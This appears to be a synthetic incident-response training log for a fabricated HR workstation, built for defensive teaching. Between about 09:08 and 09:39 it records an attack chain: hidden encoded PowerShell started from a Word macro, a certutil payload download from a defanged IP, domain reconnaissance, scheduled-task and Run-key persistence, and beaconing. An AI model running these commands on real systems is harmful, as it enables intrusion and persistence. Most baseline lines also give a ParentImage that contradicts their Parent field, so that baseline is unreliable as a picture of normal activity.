# Session 2 — HR-WS-08 log pack

> **SYNTHETIC TEACHING DATA — CODED Blue Team Classroom**
> Every host, account, address, domain and hash below is fabricated for this
> workshop. No real environment produced this data. Do not visit any address or
> domain shown. Addresses are written defanged (hxxp://, 185[.]220[.]101[.]45)
> where they would otherwise be clickable.
>
> Merged Windows Security, Sysmon and proxy events. One four-hour window. Roughly 400 lines.

## Host

```
Hostname : HR-WS-08
Role     : HR department workstation
OS       : Windows 11 Enterprise 23H2
Sysmon   : deployed, SwiftOnSecurity-derived configuration
Audit    : Process Creation Auditing enabled with command line capture
Date     : 2026-03-12
```

## Before you filter anything

Read fifty consecutive lines from the middle of this file. You cannot recognise
abnormal activity without first knowing what ordinary activity on this host
looks like. That is task T1 and it is not optional.

---

```
08:02:41  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=7485  Parent=explorer.exe
08:07:21  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=4057  Parent=services.exe
08:07:59  Security:4624  User=HR\s.alqattan  LogonType=3  Source=10.0.4.18  AuthPkg=Kerberos
08:11:36  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=7115  Parent=chrome.exe
08:17:17  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=5192  Parent=MsMpEng.exe
08:17:48  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=7835  Parent=svchost.exe
08:18:08  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=2451  Parent=explorer.exe
08:21:44  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=5558  Parent=svchost.exe
08:23:29  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=8039  Parent=MsMpEng.exe
08:23:44  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=3455  Parent=services.exe
08:24:04  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=7227  Parent=OUTLOOK.EXE
08:25:13  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5299  Parent=chrome.exe
08:28:41  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=2008  Parent=explorer.exe
08:30:05  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=6220  Parent=explorer.exe
08:31:50  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=6070  Parent=services.exe
08:32:16  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=7328  Parent=svchost.exe
08:37:56  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=1093  Parent=chrome.exe
08:38:10  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=8588  Parent=services.exe
08:40:20  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=2780  Parent=chrome.exe
08:42:02  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=3294  Parent=explorer.exe
08:42:27  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=4315  Parent=services.exe
08:47:38  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=5213  Parent=explorer.exe
08:50:39  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=6009  Parent=svchost.exe
08:56:57  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=1804  Parent=explorer.exe
08:57:57  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=4576  Parent=OUTLOOK.EXE
09:01:31  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=6569  Parent=services.exe
09:02:14  Security:4624  User=HR\s.alqattan  LogonType=2  Workstation=HR-WS-08  AuthPkg=Kerberos
09:05:11  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=8887  Parent=svchost.exe
09:08:51  Sysmon:1  ParentImage=OUTLOOK.EXE  Image=WINWORD.EXE  CommandLine="WINWORD.EXE /n Benefits_Enrolment_2026.docm"  User=HR\s.alqattan  PID=4412
09:09:03  Sysmon:1  ParentImage=WINWORD.EXE  Image=cmd.exe  CommandLine="cmd /c powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"  User=HR\s.alqattan  PID=4498  Parent=4412
09:09:04  Sysmon:1  ParentImage=cmd.exe  Image=powershell.exe  CommandLine="powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"  User=HR\s.alqattan  PID=4501  Parent=4498
09:09:29  Sysmon:1  ParentImage=powershell.exe  Image=certutil.exe  CommandLine="certutil -urlcache -split -f hxxp://185[.]220[.]101[.]45/a.txt C:\Users\Public\od.exe"  User=HR\s.alqattan  PID=4533  Parent=4501
09:09:31  Sysmon:3  Image=certutil.exe  PID=4533  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=80  Initiated=true
09:09:44  Sysmon:11  Image=certutil.exe  PID=4533  TargetFilename=C:\Users\Public\od.exe  CreationUtcTime=2026-03-12 09:09:44
09:10:08  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=7938  Parent=services.exe
09:12:08  Sysmon:1  ParentImage=powershell.exe  Image=whoami.exe  CommandLine="whoami /all"  User=HR\s.alqattan  PID=4561  Parent=4501
09:12:09  Sysmon:1  ParentImage=powershell.exe  Image=net.exe  CommandLine="net group \"Domain Admins\" /domain"  User=HR\s.alqattan  PID=4563  Parent=4501
09:12:11  Sysmon:1  ParentImage=powershell.exe  Image=ipconfig.exe  CommandLine="ipconfig /all"  User=HR\s.alqattan  PID=4565  Parent=4501
09:15:24  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=8110  Parent=explorer.exe
09:16:30  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=7931  Parent=services.exe
09:17:33  Sysmon:1  ParentImage=powershell.exe  Image=schtasks.exe  CommandLine="schtasks /create /tn \"OneDriveSync\" /tr C:\Users\Public\od.exe /sc onlogon /f"  User=HR\s.alqattan  PID=4602  Parent=4501
09:17:34  Security:4698  TaskName=\OneDriveSync  TaskContent=C:\Users\Public\od.exe  SubjectUserName=s.alqattan
09:19:10  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=3739  Parent=services.exe
09:19:47  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=5736  Parent=explorer.exe
09:22:50  Sysmon:13  EventType=SetValue  TargetObject=HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync  Details=C:\Users\Public\od.exe
09:24:40  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5327  Parent=explorer.exe
09:26:20  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=7151  Parent=explorer.exe
09:29:14  Security:4624  User=HR\s.alqattan  LogonType=3  Source=10.0.4.18  AuthPkg=Kerberos
09:29:51  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=4627  Parent=explorer.exe
09:31:02  Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true
09:31:25  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=5600  Parent=services.exe
09:31:54  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=8039  Parent=explorer.exe
09:33:07  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=4064  Parent=services.exe
09:34:09  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=7474  Parent=explorer.exe
09:35:02  Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true
09:39:02  Sysmon:3  Image=od.exe  PID=4731  Protocol=tcp  DestinationIp=185[.]220[.]101[.]45  DestinationPort=443  Initiated=true
09:45:06  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=5576  Parent=explorer.exe
09:46:06  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=2512  Parent=services.exe
09:46:53  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=4160  Parent=explorer.exe
09:51:04  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=5018  Parent=MsMpEng.exe
09:52:05  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=7347  Parent=services.exe
09:52:53  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=3122  Parent=services.exe
09:54:02  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=WmiPrvSE.exe  User=HR\s.alqattan  PID=2456  Parent=svchost.exe
09:54:17  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=5972  Parent=explorer.exe
09:54:20  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=WmiPrvSE.exe  User=HR\s.alqattan  PID=1265  Parent=svchost.exe
09:54:21  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=7835  Parent=explorer.exe
10:00:22  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=8789  Parent=services.exe
10:04:25  Security:4624  User=HR\s.alqattan  LogonType=3  Source=10.0.4.18  AuthPkg=Kerberos
10:05:49  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=2368  Parent=services.exe
10:15:51  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=3889  Parent=explorer.exe
10:17:02  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=WmiPrvSE.exe  User=HR\s.alqattan  PID=5236  Parent=svchost.exe
10:21:13  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=3166  Parent=MsMpEng.exe
10:24:20  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=2439  Parent=services.exe
10:24:24  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=2275  Parent=services.exe
10:28:03  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=1442  Parent=MsMpEng.exe
10:28:50  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=5031  Parent=explorer.exe
10:31:04  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=7577  Parent=services.exe
10:33:17  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=6649  Parent=OUTLOOK.EXE
10:37:30  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=5792  Parent=MsMpEng.exe
10:39:14  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=WmiPrvSE.exe  User=HR\s.alqattan  PID=1446  Parent=svchost.exe
10:45:55  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=5869  Parent=services.exe
10:46:07  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=1869  Parent=explorer.exe
10:47:46  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5898  Parent=explorer.exe
10:48:07  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=WmiPrvSE.exe  User=HR\s.alqattan  PID=6192  Parent=svchost.exe
10:49:37  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=4593  Parent=explorer.exe
10:50:42  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5640  Parent=explorer.exe
10:50:50  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5081  Parent=explorer.exe
10:51:47  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=7912  Parent=MsMpEng.exe
10:52:24  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=7583  Parent=explorer.exe
10:56:09  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=8851  Parent=explorer.exe
10:58:39  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=7475  Parent=services.exe
11:02:21  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=4263  Parent=explorer.exe
11:11:30  Security:4624  User=HR\s.alqattan  LogonType=3  Source=10.0.4.18  AuthPkg=Kerberos
11:16:31  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=4538  Parent=explorer.exe
11:16:41  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=EXCEL.EXE  User=HR\s.alqattan  PID=6059  Parent=explorer.exe
11:24:52  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5895  Parent=explorer.exe
11:25:29  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=6697  Parent=services.exe
11:29:35  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=5702  Parent=services.exe
11:29:43  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=1559  Parent=explorer.exe
11:30:21  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=2199  Parent=chrome.exe
11:35:00  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MsMpEng.exe  User=HR\s.alqattan  PID=5554  Parent=services.exe
11:35:45  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=3911  Parent=chrome.exe
11:35:50  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=OUTLOOK.EXE  User=HR\s.alqattan  PID=7621  Parent=explorer.exe
11:37:48  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=taskhostw.exe  User=HR\s.alqattan  PID=1151  Parent=svchost.exe
11:38:47  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=spoolsv.exe  User=HR\s.alqattan  PID=2993  Parent=services.exe
11:39:55  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=3726  Parent=MsMpEng.exe
11:44:42  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=6641  Parent=explorer.exe
11:46:13  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=svchost.exe  User=HR\s.alqattan  PID=2857  Parent=services.exe
11:46:14  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=8644  Parent=explorer.exe
11:47:49  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=4130  Parent=chrome.exe
11:51:17  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=7782  Parent=OUTLOOK.EXE
11:54:07  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=8524  Parent=explorer.exe
11:54:55  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=notepad.exe  User=HR\s.alqattan  PID=2954  Parent=explorer.exe
11:57:13  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=MpCmdRun.exe  User=HR\s.alqattan  PID=6691  Parent=MsMpEng.exe
11:58:11  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=Teams.exe  User=HR\s.alqattan  PID=2237  Parent=explorer.exe
11:59:56  Sysmon:1  ParentImage=C:\Windows\explorer.exe Image=chrome.exe  User=HR\s.alqattan  PID=5611  Parent=explorer.exe
```

---

## What is NOT in this pack

Part of task T4 is identifying what log evidence structurally cannot tell you.
This pack deliberately contains no mail gateway logs, no memory capture and no
disk image. If your answer to "how was the document delivered" is "the pack
contains no mail gateway events, so delivery cannot be established from this
evidence" — that is a correct and complete answer.

